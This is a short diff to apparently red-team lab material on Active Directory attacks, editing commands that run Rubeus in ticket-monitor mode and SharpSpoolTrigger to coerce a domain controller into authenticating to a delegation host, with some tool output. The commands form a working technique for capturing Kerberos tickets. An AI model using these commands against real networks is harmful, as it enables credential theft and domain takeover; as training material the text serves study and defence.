@@ -8,13 +8,13 @@ There are multiple 'remote authentication triggers' that can be used to force a 
 We could therefore monitor for tickets on lon-ws-1:
 
 ```powershell
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:5 /nowrap
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:5 /nowrap
 ```
 
 Then use a tool such as [SharpSystemTriggers](https://github.com/cube0x0/SharpSystemTriggers) to force _lon-dc-1_ to authenticate to _lon-ws-1_.
 
 ```powershell
-beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1
+beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe enc-fs-1 enc-jmp-1
 
 NdrClientCall2x64
 [-]RpcRemoteFindFirstPrinterChangeNotificationEx status: 6
